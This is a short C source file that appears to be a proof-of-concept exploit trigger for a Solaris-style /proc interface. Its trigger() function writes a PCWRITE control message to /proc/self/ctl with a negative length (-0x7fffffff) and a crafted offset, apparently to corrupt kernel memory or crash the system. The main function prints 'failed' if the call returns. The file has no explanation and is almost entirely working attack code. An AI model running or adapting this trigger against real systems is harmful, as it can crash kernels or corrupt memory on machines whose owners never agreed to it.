#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wait.h>
#include <search.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/param.h>
#include <sys/procset.h>
#include <sys/priocntl.h>
#include <procfs.h>
#include <sys/proc.h>
#include <sys/user.h>

#define PIOC            ('q'<<8)
#define PIOCGETPR       (PIOC|36)       /* read struct proc */
#define PIOCGETU        (PIOC|37)       /* read user area */

void trigger() {
	int fd;
	int n;
 	long ctl[1 + sizeof (priovec_t) / sizeof (long)];
    long *ctlp = ctl;
	priovec_t *pr;
	unsigned long val;
	int uptrsize = 160;

	char *uptr = malloc(uptrsize);
	memset(uptr,0xcc, uptrsize);

	fd = open("/proc/self/ctl",O_WRONLY);
	if (fd == -1) {
		perror("open");
		exit(-1);
	}	

	*ctlp++ = PCWRITE;
    pr = (priovec_t *)ctlp;
	pr->pio_base = uptr;
	pr->pio_len =-0x7fffffff;
	pr->pio_offset =4096-uptrsize;

	n = write(fd, ctl, sizeof(ctl));
	if (n == -1) perror("write");
}

int main () {
	trigger();
	printf("failed\n");
	return -1;
}

